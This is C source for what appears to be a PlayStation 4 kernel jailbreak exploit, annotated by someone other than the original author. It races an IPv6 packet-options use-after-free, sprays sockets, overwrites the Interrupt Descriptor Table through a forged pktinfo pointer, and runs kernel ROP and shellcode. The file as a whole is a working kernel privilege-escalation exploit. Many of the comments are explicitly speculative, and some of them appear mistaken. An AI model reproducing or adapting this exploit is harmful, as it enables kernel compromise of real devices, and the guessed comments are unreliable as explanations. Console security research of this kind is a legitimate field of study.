/* SIDE-NOTE: The following comments that are present within this file are purely from my observation and speculation. 
If you happen to see this Sleirsgoevy or maybe someone who has more in-depth knowledge on this, please let me know over 
at my Discord (a0zhar#9539), or create an issue if you have time to spare, detailing and/or including corrections for any 
mistakes I made in the comments.
--Thanks :)*/
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/param.h>
#include <sys/cpuset.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <netinet6/ip6_var.h>
#include <unistd.h>
#include <time.h>
#include <sys/mman.h>
#include "8cc/printf/printf.h"
#include "8cc/librop/pthread_create.h"
#include "8cc/ps4/errno.h"


typedef struct opaque {
    volatile int triggered; // Indicates if the jailbreak has been triggered
    volatile int padding;   // Padding to ensure proper alignment of subsequent variables
    volatile int done1;     // Indicates the completion of phase 1 of the jailbreak
    volatile int done2;     // Indicates the completion of phase 2 of the jailbreak
    int master_sock;        // Unknown (by A0zhar) at the moment
    int kevent_sock;        // Unknown (by A0zhar) at the moment
    int* spray_sock;        // Unknown (by A0zhar) at the moment
}OPAQUE;

// Struct to hold data for the spray process
typedef struct spray_opaque {
    int cpu;              // The CPU core to perform the spray on (chosen for optimization)
    void* spray_map;      // Pointer to the spray memory mapping (used for spraying objects in memory)
    uint64_t kernel_base; // Base address of the kernel in memory (obtained through exploitation)
    int* flag;            // Pointer to the flag used during the spray process (used for synchronization)
}SPRAY_OPAQUE;

void (*enter_krop)(void);        // Function pointer to the krop shellcode (exploitation technique)
extern uint64_t krop_idt_base;   // the base address of the Interrupt Descriptor Table (IDT)
extern uint64_t krop_jmp_crash;  // the shellcode to perform a crash via jump (exploitation)
extern uint64_t krop_ud1;        // the shellcode to cause an invalid opcode exception (UD1 instruction, exploitation)
extern uint64_t krop_ud2;        // the shellcode to cause an invalid opcode exception (UD2 instruction, exploitation)
extern uint64_t krop_read_cr0;   // the shellcode to read the CR0 control register (exploitation)
extern uint64_t krop_read_cr0_2; // the shellcode to read the CR0 control register again (exploitation)
extern uint64_t krop_write_cr0;  // the shellcode to write to the CR0 control register (exploitation)
extern uint64_t krop_c3bak1;     // the shellcode to perform a syscall (SYSENTER, exploitation)
extern uint64_t krop_c3bak2;     // the shellcode to perform a syscall (SYSENTER, exploitation)
extern uint64_t krop_kernel_base;// the kernel base address (obtained through exploitation)
extern uint64_t krop_master_sock;// the master socket (obtained through exploitation)
extern char spray_bin[];         // the binary data used in the spray (exploitation technique)
extern char spray_end[];         // the end of the binary data used in the spray (exploitation technique)


#define IPV6_2292PKTINFO    19
#define IPV6_2292PKTOPTIONS 25
#define TCLASS_MASTER       0x13370000
#define TCLASS_MASTER_2     0x73310000
#define TCLASS_SPRAY        0x41
#define TCLASS_TAINT        0x42

// ps4-rop-8cc generates thread-unsafe code, so each racing thread needs its own get_tclass function
#define GET_TCLASS(name) \
int name(int s) { \
    int optval; \
    socklen_t optlen = sizeof(optval); \
    if(getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &optval, &optlen))\
        *(volatile int*)0;\
    return optval;\
}

GET_TCLASS(get_tclass)
GET_TCLASS(get_tclass_2)
GET_TCLASS(get_tclass_3)

int set_tclass(int s, int val) {
    if (setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
        *(volatile int*)0;
}

#define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
#define set_rthdr(s, buf, len)   setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
#define free_pktopts(s)          set_pktopts(s, NULL, 0)
#define set_pktinfo(s, buf)      setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo))

int get_rthdr(int s, char* buf, int len) {
    socklen_t l = len;
    if (getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &l))
        *(volatile int*)0;
    return l;
}

int get_pktinfo(int s, char* buf) {
    socklen_t optlen = sizeof(struct in6_pktinfo);
    if (getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &optlen))
        *(volatile int*)0;
    return optlen;
}

void* use_thread(void* arg) {
    OPAQUE* o = (OPAQUE*)arg;
    char buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr* cmsg = (struct cmsghdr*)buf;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    cmsg->cmsg_level = IPPROTO_IPV6;
    cmsg->cmsg_type = IPV6_TCLASS;
    *(int*)CMSG_DATA(cmsg) = 0;
    while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
        if (set_pktopts(o->master_sock, buf, sizeof(buf)))
            *(volatile int*)0;
    o->triggered = 1;
    o->done1 = 1;
}

void* free_thread(void* arg) {
    OPAQUE* o = (OPAQUE*)arg;
    while (!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY) {
        if (free_pktopts(o->master_sock))
            *(volatile int*)0;
        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
    }
    o->triggered = 1;
    o->done2 = 1;
}

void trigger_uaf(OPAQUE* o) {
    o->triggered = o->padding = o->done1 = o->done2 = 0;
    int qqq[256];
    pthread_create(qqq, NULL, use_thread, o);
    pthread_create(qqq + 128, NULL, free_thread, o);
    for (;;) {
        for (int i = 0; i < 32; i++)
            set_tclass(o->spray_sock[i], TCLASS_SPRAY);
        if (get_tclass(o->master_sock) == TCLASS_SPRAY)
            break;
        for (int i = 0; i < 32; i++)
            if (free_pktopts(o->spray_sock[i]))
                *(volatile int*)0;
        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
    }
    printf("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
    o->triggered = 1;
    while (!o->done1 || !o->done2);
}

int build_rthdr_msg(char* buf, int size) {
    int len = ((size / 8) - 1) & ~1;
    size = (len + 1) * 8;
    struct ip6_rthdr* rthdr = (struct ip6_rthdr*)buf;
    rthdr->ip6r_nxt = 0;
    rthdr->ip6r_len = len;
    rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
    rthdr->ip6r_segleft = rthdr->ip6r_len / 2;
    return size;
}

#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
#define PKTOPTS_RTHDR_OFFSET   (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
#define PKTOPTS_TCLASS_OFFSET  (offsetof(struct ip6_pktopts, ip6po_tclass))

int fake_pktopts(OPAQUE* o, int overlap_sock, int tclass0, unsigned long long pktinfo) {
    free_pktopts(overlap_sock);
    char buf[0x100] = { 0 };
    int l = build_rthdr_msg(buf, 0x100);
    int tclass;
    for (;;) {
        for (int i = 0; i < 32; i++) {
            *(unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
            *(unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
            if (set_rthdr(o->spray_sock[i], buf, l))
                *(volatile int*)0;
        }
        tclass = get_tclass(o->master_sock);
        if ((tclass & 0xffff0000) == tclass0)
            break;
        for (int i = 0; i < 32; i++)
            if (set_rthdr(o->spray_sock[i], NULL, 0))
                *(volatile int*)0;
    }
    return tclass & 0xffff;
}

unsigned long long __builtin_gadget_addr(const char*);
unsigned long long rop_call_funcptr(void(*)(void*), ...);

void sidt(unsigned long long* addr, unsigned short* size) {
    char buf[10];
    unsigned long long ropchain[14] = {
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rsi"),
        ropchain + 13,
        __builtin_gadget_addr("mov [rsi], rax"),
        __builtin_gadget_addr("pop rsi"),
        ~7ull,
        __builtin_gadget_addr("sub rdi, rsi ; mov rdx, rdi"),
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rcx"),
        0x7d,
        __builtin_gadget_addr("add rax, rcx"),
        __builtin_gadget_addr("sidt [rax - 0x7d]"),
        __builtin_gadget_addr("pop rsp"),
        0
    };
    ((void(*)(char*))ropchain)(buf);
    *size = *(unsigned short*)buf;
    *addr = *(unsigned long long*)(buf + 2);
}

void pin_to_cpu(int cpu) {
    cpuset_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
}
int main() {
    // Check if the program can escalate privileges to root (UID 0)
    if (!setuid(0))
        return 179; // If successful, return 179

    // Spray 16 new sockets of type AF_INET6 (IPv6) and SOCK_DGRAM (UDP)
    for (int i = 0; i < 16; i++, socket(AF_INET6, SOCK_DGRAM, 0));

    // Declare variables for further use
    int tmp;
    uint64_t idt_base;
    uint16_t idt_size;

    // Get the Interrupt Descriptor Table (IDT) base address and size
    sidt(&idt_base, &idt_size);
    // Print the IDT size and base address in hexadecimal format
    printf("sidt = 0x%hx 0x%llx\n", idt_size, idt_base);

    // Set kernel base address using the IDT base address and known offset
    krop_idt_base = idt_base;
    uint64_t kernel_base = idt_base - 0x1bbb9e0;
    krop_kernel_base = kernel_base;

    // Calculate and set the addresses for various kernel functions used in the exploit
    krop_jmp_crash = kernel_base + 0x1c0;
    krop_read_cr0 = kernel_base + 0xa1b70;
    krop_read_cr0_2 = kernel_base + 0xa1b70;
    krop_write_cr0 = kernel_base + 0xa1b79;

    // Create two sockets, one for kevent and another for the master socket
    int kevent_sock = socket(AF_INET6, SOCK_DGRAM, 0);
    int master_sock = socket(AF_INET6, SOCK_DGRAM, 0);

    // Set the master socket value for later use
    krop_master_sock = master_sock * 8;

    // Create an array of 512 socket descriptors for socket spraying
    int spray_sock[512];
    // Perform socket spraying and keep track of the total number of created sockets
    int q1 = 0, q2 = 0;
    for (int i = 0; i < 512; i++) {
        q1 += (spray_sock[i] = socket(AF_INET6, SOCK_DGRAM, 0));
    }
    // Print the number of created sockets and the number of kqueues (kevent descriptors)
    printf("sockets=%d kqueues=%d\n", q1, q2);

    // Create an instance of the "opaque" struct to hold various data related to the jailbreak process
    struct opaque _opaque;
    _opaque.master_sock = master_sock;
    _opaque.kevent_sock = kevent_sock;
    _opaque.spray_sock = spray_sock;

    // Trigger a use-after-free vulnerability to exploit the system
    trigger_uaf(&_opaque);
    printf("uaf ok!\n");

    // Set the traffic class of the master socket to "TCLASS_TAINT"
    set_tclass(master_sock, TCLASS_TAINT);

    // Find the index of the overlapped socket from the sprayed sockets
    int overlap_idx = -1;
    for (int i = 0; i < 512; i++) {
        if (get_tclass(spray_sock[i]) == TCLASS_TAINT) {
            overlap_idx = i;
        }
    }

    // Print the index of the overlapped socket (if found)
    printf("overlap_idx = %d\n", overlap_idx);

    // Return an error code if no overlapped socket is found
    if (overlap_idx < 0)
        return 1;

    // Get the overlapped socket from the sprayed sockets
    int overlap_sock = spray_sock[overlap_idx];
    int cleanup1 = overlap_sock;

    // Create a new socket to replace the overlapped socket
    spray_sock[overlap_idx] = socket(AF_INET6, SOCK_DGRAM, 0);

    // Find the index of the overlapped socket again, after replacing it
    overlap_idx = fake_pktopts(&_opaque, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
    printf("overlap_idx = %d\n", overlap_idx);

    // Return an error code if no overlapped socket is found again
    if (overlap_idx < 0)
        return 1;

    // Get the overlapped socket from the sprayed sockets after the second replacement
    overlap_sock = spray_sock[overlap_idx];
    int cleanup2 = overlap_sock;

    // Create a new socket to replace the overlapped socket for the third time
    spray_sock[overlap_idx] = socket(AF_INET6, SOCK_DGRAM, 0);

    // Allocate memory for "buf" to hold data from a specific socket option
    char buf[20];

    // Print the contents of the specific socket option ("pktinfo") for the master socket
    printf("get_pktinfo() = %d\n", get_pktinfo(master_sock, buf));

    // Print the original contents of the IDT before corruption
    printf("idt before corruption: ");
    for (int i = 0; i < 20; i++)
        printf("%02x ", (unsigned)(unsigned char)buf[i]);
    printf("\n");

    // Create a copy of "buf" for manipulation
    char buf2[20];
    for (int i = 0; i < 20; i++)
        buf2[i] = buf[i];

    // Calculate and set addresses for various gadgets and store them in krop_* variables
    uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");
    krop_c3bak1 = *(uint64_t*)(buf2 + 4);
    krop_c3bak2 = *(uint64_t*)(buf2 + 12);
    *(uint16_t*)(buf2 + 4) = (uint16_t)entry_gadget;
    *(uint64_t*)(buf2 + 10) = entry_gadget >> 16;
    buf2[9] = 0x8e;
    krop_ud1 = *(uint64_t*)(buf2 + 4);
    krop_ud2 = *(uint64_t*)(buf2 + 12);
    buf2[9] = 0xee;

    // Print the manipulated contents of the IDT after corruption
    printf("idt after corruption:  ");
    for (int i = 0; i < 20; i++)
        printf("%02x ", (unsigned)(unsigned char)buf2[i]);
    printf("\n");

    // Set the manipulated "pktinfo" socket option for the master socket
    printf("set_pktinfo() = %d\n", set_pktinfo(master_sock, buf2));

    // Call the enter_krop function, which contains the kernel ropchain
    enter_krop();

    // Allocate memory for "spray_start," "spray_stop," and "spray_map"
    char* spray_start = spray_bin;
    char* spray_stop = spray_end;
    char* spray_map = mmap(0, spray_stop - spray_start, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);

    // Print the address of the sprayed shellcode map
    printf("spray_map = 0x%llx\n", spray_map);

    // Copy the contents of the shellcode binary to the sprayed memory region
    for (size_t i = 0; i < spray_stop - spray_start; i++)
        spray_map[i] = spray_start[i];

    // Perform malloc sprays to reclaim any potential double frees
    // Pin the execution to specific CPU cores (6 and 7) for ROP execution
    pin_to_cpu(6);
    rop_call_funcptr(spray_map, spray_sock, kernel_base);
    pin_to_cpu(7);
    rop_call_funcptr(spray_map, NULL, kernel_base);

    // Return 0 to indicate successful completion
    return 0;
}
